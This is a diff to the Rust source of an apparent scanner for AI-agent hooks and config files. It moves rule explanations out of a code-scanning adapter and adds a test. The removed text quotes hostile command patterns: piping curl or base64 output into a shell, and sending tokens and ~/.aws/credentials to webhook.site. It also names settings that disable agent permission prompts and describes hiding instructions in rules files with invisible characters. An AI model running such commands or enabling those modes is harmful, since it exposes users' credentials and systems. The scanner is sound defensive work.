@@ -249,167 +249,19 @@ fn notification(path: &RepoPath, text: String) -> Notification {
     }
 }
 
-/// What a rule means, and what to do about it. Apart from [`rule`] so the
-/// prose can grow without the shape growing with it.
-fn explained(id: RuleId) -> (&'static str, &'static str) {
-    match id {
-        RuleId::InvisibleUnicode => (
-            "An instruction, rules, skill or hook file holds a character that renders \
-             as nothing: zero-width, bidirectional, tag-block or another \
-             default-ignorable character. The model reads it and a reviewer does not, \
-             which is how the Rules File Backdoor, disclosed by Pillar Security on 18 \
-             March 2025, hid instructions in rules files. In a hook script it is \
-             Trojan Source, CVE-2021-42574.",
-            "Open the file in an editor that shows invisible characters and remove the \
-             character unless it was put there on purpose. The evidence shows it as \
-             <U+XXXX>, never the character itself.",
-        ),
-        RuleId::OpaqueHook => (
-            "A hook runs on agent events with the agent's permissions, and this one \
-             cannot be read as text: it is not UTF-8, is larger than the file limit, \
-             or is a symbolic link that clew will not follow. What it runs cannot be \
-             reviewed.",
-            "Replace the hook with a script that can be reviewed, or establish where \
-             the file came from and what it does. If it is text that is only large, \
-             raise CLEW_MAX_FILE_BYTES.",
-        ),
-        RuleId::DownloadAndExecute => (
-            "A hook downloads code and hands it straight to an interpreter, as \
-             curl ... | bash does. What runs is whatever the server returns at that \
-             moment, with the agent's permissions, every time the hook fires. The \
-             compromised tj-actions/changed-files action (CVE-2025-30066, 14 March \
-             2025) ran curl ... memdump.py | sudo python3.",
-            "Download to a file, check it against a pinned checksum or signature, and \
-             run the checked file, or install the tool through a package manager with \
-             a lockfile. If the hook came from someone else, find out why it fetches \
-             code each time it runs.",
-        ),
-        RuleId::DecodeAndExecute => (
-            "A hook decodes code, from base64, hex or a compressed blob, and hands it \
-             straight to an interpreter, as echo ... | base64 -d | sh does. What runs \
-             is not what the hook shows: a review, a diff or a scanner sees only the \
-             encoded form. The xz-utils backdoor (CVE-2024-3094, disclosed by Andres \
-             Freund on 29 March 2024) kept its script in a test file and ran it during \
-             the build with ... | xz -d | /bin/bash.",
-            "Keep the code a hook runs in the hook, or in a script beside it, as text. \
-             If the hook came from someone else, decode the payload into a file without \
-             running it, and read what it does before anything runs it.",
-        ),
-        RuleId::CredentialExfiltration => (
-            "A hook sends a credential over the network: the environment, a token a \
-             tool prints such as gh auth token, a credential file such as \
-             ~/.aws/credentials or ~/.npmrc, or what a cloud metadata service \
-             answers, piped, redirected, uploaded or substituted into what curl, wget \
-             or nc sends. The Shai-Hulud worm (StepSecurity, 15 September 2025) sent \
-             a workflow's secrets with curl -d \"$CONTENTS\" https://webhook.site/..., \
-             and the compromised nx packages (StepSecurity, 27 August 2025) ran gh \
-             auth token and read ~/.npmrc before uploading what they found.",
-            "Remove the command unless sending that credential is what the hook is \
-             for. A token meant for a service belongs in the header or user that \
-             service authenticates, sent to that service alone. If the hook came from \
-             someone else, rotate every credential it could reach.",
-        ),
-        RuleId::UnverifiedDownload => (
-            "A hook downloads a file and later runs it, or unpacks it and runs what it \
-             held, without checking a checksum or a signature first. A moved tag, a \
-             mutable URL or a compromised host changes what runs, with the agent's \
-             permissions, the next time the hook fires. The loader in the keyv and \
-             cacheable compromise (Socket, 4 August 2026) downloaded a Bun release over \
-             HTTPS with no checksum or signature verification and ran it.",
-            "Pin the download to a version and check it against a published checksum or \
-             signature before running it (sha256sum -c, gpg --verify, cosign \
-             verify-blob), or install the tool through a package manager with a \
-             lockfile.",
-        ),
-        RuleId::UnpinnedRemotePackage => (
-            "A hook runs a package from a registry at a tag that moves, as npx \
-             claude-flow@latest does, so it runs whichever version was published last, \
-             every time it fires, with the agent's permissions. In the Shai-Hulud \
-             attack (StepSecurity, 15 September 2025), compromised versions of \
-             @ctrl/tinycolor and 40 other npm packages carried a postinstall payload; \
-             a runner fetching the latest release at that moment fetched it.",
-            "Pin the package to an exact version (npx tool@1.4.2), or add it to the \
-             project's dependencies so the lockfile decides the version and checks its \
-             integrity.",
-        ),
-        RuleId::BypassPermissions => bypass_permissions(),
-        RuleId::UnrestrictedShell => unrestricted_shell(),
-        RuleId::TrustedServer => trusted_server(),
-    }
-}
-
-/// What `bypass-permissions` means, and what to do about it.
-fn bypass_permissions() -> (&'static str, &'static str) {
-    (
-        "A configuration file starts an agent with nothing asking before it acts and \
-         nothing bounding what it does: Claude Code's permissions.defaultMode set to \
-         bypassPermissions, Codex's sandbox_mode set to danger-full-access, VS \
-         Code's chat.tools.global.autoApprove set to true, or Zed's \
-         agent.tool_permissions.default set to allow. Any instruction the agent \
-         reads, including one smuggled into a file it is given, then runs \
-         unattended. Two limits belong on the finding: Claude Code stopped \
-         honouring bypassPermissions from project and local settings in v2.1.257, so \
-         a repository setting it reaches only an older client, and Zed's built-in \
-         security rules still prompt for a few actions.",
-        "Remove the mode and let the agent ask, or narrow what may happen without \
-         asking: permissions.allow in Claude Code, chat.tools.terminal.autoApprove \
-         in VS Code and a per-tool always_allow in Zed each pre-approve named \
-         operations rather than every one. Where a machine genuinely runs \
-         unattended, setting the mode in that machine's own user settings rather \
-         than in a file the repository ships keeps it to the machine that meant it.",
-    )
-}
-
-/// What `unrestricted-shell` means, and what to do about it.
-fn unrestricted_shell() -> (&'static str, &'static str) {
-    (
-        "A configuration file pre-approves the shell with nothing restricting what \
-         it runs: Claude Code's Bash, Bash() or Bash(*), or Gemini CLI's \
-         run_shell_command, in permissions.allow, tools.allowed, or a skill's \
-         allowed-tools. Every command the agent chooses then runs without being \
-         shown to anyone, which is the grant the other entries in those lists \
-         exist to avoid needing. A tool that takes no argument restriction, such \
-         as WebSearch or an MCP tool, is not flagged: a bare entry is the only way \
-         to write that grant.",
-        "Replace the entry with the commands the project actually runs, scoped, as \
-         Bash(cargo test:*) and run_shell_command(git) are. Where a broad grant is \
-         genuinely wanted, keeping it in a personal settings.local.json rather than \
-         the file the repository ships limits it to the person who chose it.",
-    )
-}
-
-/// What `trusted-server` means, and what to do about it.
-fn trusted_server() -> (&'static str, &'static str) {
-    (
-        "An MCP server is declared with trust: true, which Gemini CLI's reference \
-         lists under \"Security bypass setting\" and documents as bypassing all tool \
-         call confirmations for that server. Every tool it offers then runs unseen, \
-         and a server decides for itself what it offers: one added after the trust was \
-         granted is trusted too, and a tool whose description changes is never shown \
-         again. The agent takes the server's word for what it is being asked to do.",
-        "Remove trust and confirm the calls, or keep it only for a server whose code \
-         you control and whose tool list you pin. Where the confirmations are too \
-         noisy, includeTools names the ones a project actually uses, which bounds the \
-         server without turning the prompt off. Cline's autoApprove and VS Code's \
-         chat.tools.eligibleForAutoApproval do the same by naming tools rather than \
-         trusting all of them.",
-    )
-}
-
 /// What code scanning shows about a rule: the domain's one line, then what it
 /// means and what to do about it.
 fn rule(id: RuleId) -> Rule {
-    let (full, help) = explained(id);
     Rule {
         id: id.as_str(),
         short_description: Text {
             text: id.description().to_owned(),
         },
         full_description: Text {
-            text: full.to_owned(),
+            text: id.detail().to_owned(),
         },
         help: Text {
-            text: help.to_owned(),
+            text: id.remediation().to_owned(),
         },
         properties: Properties {
             tags: ["security"],
@@ -679,6 +531,19 @@ mod tests {
                 .contains("includeTools"),
             "{rule}"
         );
+    }
+
+    /// The log carries the domain's words. A copy in this adapter would drift
+    /// from what `explain` and the rule's page say.
+    #[test]
+    fn a_rule_is_described_in_the_words_the_domain_holds() {
+        for id in RuleId::all() {
+            let described = rule(*id);
+            assert_eq!(described.id, id.as_str());
+            assert_eq!(described.short_description.text, id.description());
+            assert_eq!(described.full_description.text, id.detail());
+            assert_eq!(described.help.text, id.remediation());
+        }
     }
 
     /// Only the rules that found something are listed, once each, and every
